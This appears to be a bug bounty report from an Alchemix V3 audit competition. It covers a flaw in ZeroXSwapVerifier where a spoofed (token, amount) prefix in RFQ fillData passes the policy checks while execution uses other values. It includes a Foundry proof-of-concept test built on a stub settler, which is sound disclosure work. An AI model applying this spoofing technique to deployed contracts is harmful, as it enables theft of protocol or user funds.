# 57169 sc low zeroxswapverifier policy bypass via rfq filldata prefix token amount spoof&#x20;

**Submitted on Oct 24th 2025 at 03:21:39 UTC by @edantes for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57169
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

ZeroXSwapVerifier.\_verifyRFQVIP trusts a flat (address token, uint256 amount) prefix when extracting (sellToken, amount) from fillData. Because RFQ fillData is an arbitrary bytes blob, an attacker can prepend a fake (token, amount) pair that passes all verifier checks while the actual RFQ payload later in the blob sells a different token and amount. This enables policy bypass (e.g., whitelist, amount bounds) and can route swaps using unintended assets, risking inventory drain or mis-accounting when integrated into settlement flows.

## Vulnerability Details

**Root cause**

Affected code path:

* ZeroXSwapVerifier.\_verifyRFQVIP(bytes memory action, …) decodes (uint256 info, bytes fillData) and then calls \_extractTokenAndAmountFromRFQ(fillData).
* \_extractTokenAndAmountFromRFQ does abi.decode(\_slice(fillData, 0, 64), (address, uint256)), it assumes the first 64 bytes of fillData encode (address token, uint256 amount).

RFQ fillData is not guaranteed to be shaped with (token, amount) at offset 0. By prepending an attacker-chosen (token, amount) pair that meets policy, the verifier greenlights the action even if the real values consumed by execution are elsewhere in the blob.

## Impact Details

If this library gates which swaps are permitted for protocol-owned funds or user funds under protocol control (e.g., via allowances/escrows), an attacker can:

* Bypass token whitelist / policy by spoofing the prefix and executing with a different token.
* Bypass amount constraints (none are enforced for RFQ VIP) and swap unexpected sizes.
* Potentially drain or mis-route inventory, cause invariant breaks, and/or mis-account debt/credit if downstream components trust the verifier’s outcome.

**Risk Breakdown**

**Critical:** This PoC shows a parsing mismatch that lets a crafted RFQ action pass ZeroXSwapVerifier while the executor settles a different token/amount. If the protocol relies on this verifier before sending swaps with approvals/custodyed assets (as Alchemix states), an attacker can route a trade that moves the wrong token or drains value.

## Recommendation

**1. Decode RFQ fillData canonically:** match 0x’s actual RFQ fill encoding instead of assuming a prefix. Respect dynamic offset pointers when decoding nested bytes.

**2. Bind checks to what execution will actually use:**

* Verify sellToken and amount at the same offsets the executor/settler will consume.
* Enforce amount bounds / slippage on RFQ VIP actions (today, maxSlippageBps is unused on this path).

**3. Fail-closed on structure mismatch:** validate fillData.length and internal offsets; reject if the expected struct layout is not satisfied.

**4. Defense-in-depth:**

* Cross-check saa.buyToken with extracted sell/buy token semantics for RFQ.
* Consider re-encoding normalized values and comparing against the original fillData (or verifying a signed quote hash) to prevent prefix/tail spoofing.

## Proof of Concept

## Proof of Concept

By spoofing a (token, amount) prefix in RFQ fillData, an attacker can pass the verifier while the actual execution uses a different token/amount, bypassing policy and risking inventory drain.

How to run:

```bash
# from repo
forge test --match-path src/test/PoC_ZeroXSwapVerifier_RfqPrefixSpoof.t.sol -vvv
```

File: src/test/PoC\_ZeroXSwapVerifier\_RfqPrefixSpoof.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ZeroXSwapVerifier} from "src/utils/ZeroXSwapVerifier.sol";

contract RfqSettlerStub {
    event Decoded(address token, uint256 amount);

    function decodeTokenAmount(bytes calldata fillData)
        public
        pure
        returns (address token, uint256 amount)
    {
        require(fillData.length >= 64, "fillData too short");
        uint256 start = fillData.length - 64;
        (token, amount) = abi.decode(fillData[start:], (address, uint256));
    }

    // Simulate rfqVIP(uint256 info, bytes fillData) "execution"
    function rfqVIP(uint256 /*info*/, bytes calldata fillData)
        external
        returns (address token, uint256 amount)
    {
        (token, amount) = decodeTokenAmount(fillData);
        emit Decoded(token, amount);
    }
}

contract PoC_ZeroXSwapVerifier_RfqPrefixSpoof_Repo is Test {
    // Local copies of 0x selectors used by the verifier library
    bytes4 constant EXECUTE_SELECTOR = 0xcf71ff4f;
    bytes4 constant RFQ_VIP          = 0x0dfeb419;

    // Actors/tokens
    address internal constant OWNER          = address(0xA11cE);
    address internal constant TOKEN_EXPECTED = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE); // “allowed” token per policy
    address internal constant TOKEN_REAL     = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF); // actually used by RFQ settlement

    RfqSettlerStub internal stub;

    function setUp() public {
        stub = new RfqSettlerStub();
    }

    // Helpers to build actions/calls in the same shape the verifier expects
    function _encodeRfqAction(bytes memory fillData) internal pure returns (bytes memory) {
        uint256 dummyInfo = 0x1234;
        return bytes.concat(RFQ_VIP, abi.encode(dummyInfo, fillData));
    }

    function _encodeExecuteCall(ZeroXSwapVerifier.SlippageAndActions memory saa) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, bytes(""));
    }

    /// Control: when the *prefix* token != target token, the verifier rejects with "IT".
    function test_RfqPrefixMismatch_reverts_IT() public {
        bytes memory honestPrefix = abi.encode(TOKEN_REAL, uint256(777));
        bytes memory action = _encodeRfqAction(honestPrefix);

        ZeroXSwapVerifier.SlippageAndActions memory saa;
        saa.recipient    = address(this);
        saa.buyToken     = TOKEN_EXPECTED;
        saa.minAmountOut = 1;
        saa.actions      = new bytes[] (1);
        saa.actions[0]   = action;

        bytes memory callData = _encodeExecuteCall(saa);

        vm.expectRevert(bytes("IT"));
        ZeroXSwapVerifier.verifySwapCalldata(callData, OWNER, TOKEN_EXPECTED, 10_000);
    }

    /// PoC: Spoof the RFQ `fillData` so the **first** 64 bytes match policy (TOKEN_EXPECTED, amount),
    /// but the **last** 64 bytes (which our stub "settler" uses) sell TOKEN_REAL for a different amount.
    function test_RfqPrefixSpoof_bypassesVerifier_butExecutorUsesDifferentToken() public {
        // Prefix that satisfies the verifier
        bytes memory fakePrefix = abi.encode(TOKEN_EXPECTED, uint256(1e18));

        // "Real" settlement tail used by our stub
        address realToken  = TOKEN_REAL;
        uint256 realAmount = 42;

        // Full fillData := [spoofed prefix][...arbitrary middle...][real (token,amount) tail]
        bytes memory arbitraryMiddle = abi.encode(
            bytes("RFQ_BODY"), uint256(999), address(0xBEEF), bytes("extra")
        );
        bytes memory fillData = bytes.concat(fakePrefix, arbitraryMiddle, abi.encode(realToken, realAmount));

        // Build the rfqVIP action and execute(...) calldata
        bytes memory action = _encodeRfqAction(fillData);

        ZeroXSwapVerifier.SlippageAndActions memory saa;
        saa.recipient    = address(this);
        saa.buyToken     = TOKEN_EXPECTED; // policy says we expect TOKEN_EXPECTED
        saa.minAmountOut = 1;
        saa.actions      = new bytes[] (1);
        saa.actions[0]   = action;

        bytes memory callData = _encodeExecuteCall(saa);

        // 1) Verifier PASS: it only checks the FIRST 64 bytes (fakePrefix)
        bool verified = ZeroXSwapVerifier.verifySwapCalldata(callData, OWNER, TOKEN_EXPECTED, 10_000);
        assertTrue(verified, "[PoC] Verifier should accept spoofed RFQ due to flat (address,uint256) prefix assumption");

        // 2) "Execution" (our stub) reads the LAST 64 bytes -> TOKEN_REAL / 42
        (address execToken, uint256 execAmount) = stub.rfqVIP(0x1234, fillData);

        // Prove the mismatch: execution uses a different token/amount than what the verifier checked.
        assertEq(execToken, TOKEN_REAL,       "[PoC] Executor token should be TOKEN_REAL (not the verifier's expected token)");
        assertEq(execAmount, uint256(42),     "[PoC] Executor amount should be 42 (not the verifier's prefix amount)");
        assertTrue(execToken != TOKEN_EXPECTED, "[PoC] Executor token must differ from verifier-accepted token");
    }
}
```
